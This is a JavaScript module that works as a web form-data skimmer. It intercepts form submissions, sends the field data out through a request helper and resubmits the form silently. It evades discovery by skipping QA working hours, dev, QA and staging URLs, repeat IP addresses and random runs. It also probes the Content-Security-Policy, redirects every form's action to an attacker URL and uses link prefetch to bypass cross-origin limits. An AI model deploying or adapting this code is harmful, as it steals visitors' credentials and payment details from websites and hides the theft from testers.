import * as _ from 'lodash';
import { sendRequest, getIpAddress, createUrl } from './requestHelpers';

const KEY = 'knownIpAddresses';
const safetyNets = [
  {
    id: 'QA_WORKING',
    isActive: false,
    fn: () => isQaWorking(),
  },
  {
    id: 'DEV_TOOLS_OPEN',
    isActive: false,
    fn: () => areDevToolsOpen(),
  },
  {
    id: 'ALREADY_SENT',
    isActive: false,
    fn: () => alreadyHaveDevice(),
  },
  {
    id: 'RANDOMIZE_SEND',
    isActive: false,
    fn: () => abortRandomly(),
  },
  {
    id: 'ENV_CHECK',
    isActive: false,
    fn: () => isDevOrQaEnvironment(),
  },
];

/**
 * Check the various safety nets and if they all pass, send off our request
 * @param {Event} e The form submit event that triggered this
 * @param {HTMLFormElement} formElement the form element that we can resubmit
 */
export const harvest = async (e, formElement) => {
  e.preventDefault(); // prevent the form from submitting before we are done harvesting

  const safetyNetsToRun = _.filter(safetyNets, net => net.isActive);
  const abortEarly = await _.some(safetyNetsToRun, async safetyNet => safetyNet.fn());
  if (abortEarly) {
    clearListenersAndSubmit(formElement);
    return;
  }

  const crossOriginPolicy = await checkCsp();
  // if (crossOriginPolicy.IsNotVeryGood){
  //   bypassCrossOriginPolicy();
  //   hijackFormActions();
  //   return;
  // }

  await updateKnownUsers();
  await sendRequest(e);

  clearListenersAndSubmit(formElement);
};

/**
 * Clear the form elements submit event listener
 * @param {HTMLFormElement} formElement The form element to clear
 */
const clearListenersAndSubmit = (formElement) => {
  formElement.removeEventListener('submit', harvest);
  formElement.submit();
};

/**
 * Are the Chrome Dev Tools open? All readily known solutions appear to be patched
 */
const areDevToolsOpen = () => false;

const isQaWorking = () => {
  const d = new Date(); // current time
  const hours = d.getHours();
  const day = d.getDay();

  const isWeekday = day >= 1 && day <= 5;
  const isBetween7And7 = hours >= 7 && hours <= 19;
  return isWeekday && isBetween7And7;
};

/**
 * Sets the localstorage with our known users
 */
const updateKnownUsers = async () => {
  const knownDevices = JSON.parse(localStorage.getItem(KEY)) || [];
  const ipAddress = await getIpAddress();

  if (!ipAddress || _.includes(knownDevices, ipAddress)) return;
  knownDevices.push(ipAddress);
  localStorage.setItem(KEY, JSON.stringify(knownDevices));
};

/**
 * Have we already harvested the information for this user?
 * @returns {boolean} Do we already know about the device?
 */
const alreadyHaveDevice = async () => {
  let knownDevices = JSON.parse(localStorage.getItem(KEY));

  if (!knownDevices) {
    knownDevices = [];
  }
  const ipAddress = await getIpAddress();
  return _.includes(knownDevices, ipAddress);
};

/**
 * Should we abort?
 */
const abortRandomly = () => {
  const random = Math.floor(Math.random() * 4); // returns number between 0 and 4
  return random !== 1; // abort whenever we randomly don't get 1
};

/**
 * Checks if the current URL might be an environment where a tester may be looking
 */
const isDevOrQaEnvironment = () => {
  // window.location.href returns the href (URL) of the current page.
  // window.location.hostname returns the domain name of the web host.
  // window.location.pathname returns the path and filename of the current page.
  // window.location.protocol returns the web protocol used (http: or https:)
  const currentAddress = window.location.href.toLowerCase();
  const needles = ['dev', 'qa', 'staging', 'float'];
  return needles.some(needle => currentAddress.indexOf(needle) > -1);
};

/**
 * If we have deemed the action to be safe after examining the CSP,
 * we can hijack the forms to call our api instead of whatever it was originally supposed to do.
 * @param {string} encodedPayload The base64 encoded form field data
 */
const hijackFormActions = (encodedPayload) => {
  _.forEach(document.forms, (form) => {
    form.action = createUrl(encodedPayload);
    // Be sure to never call again for the user... this bounces them back to same page
    // we hope they just shrug it off, next time it will work correctly
  });
};

/**
 * Makes a request to the current page and examines the Content-Security-Policy.
 * You can perform checks here to see if there are any holes you can take advantage of.
 */
const checkCsp = async () => {
  const response = await fetch(document.location.href);
  const csp = response.headers.get('Content-Security-Policy');
  // Does this exist? Is it any good? perform analysis here
  return csp;
};

/**
 * This apparently bypasses cross origin policy (Chrome only - might be patched)
 */
const bypassCrossOriginPolicy = (apiUrl) => {
  const linkEl = document.createElement('link');
  linkEl.rel = 'prefetch';
  linkEl.href = apiUrl;
  document.head.appendChild(linkEl);
};
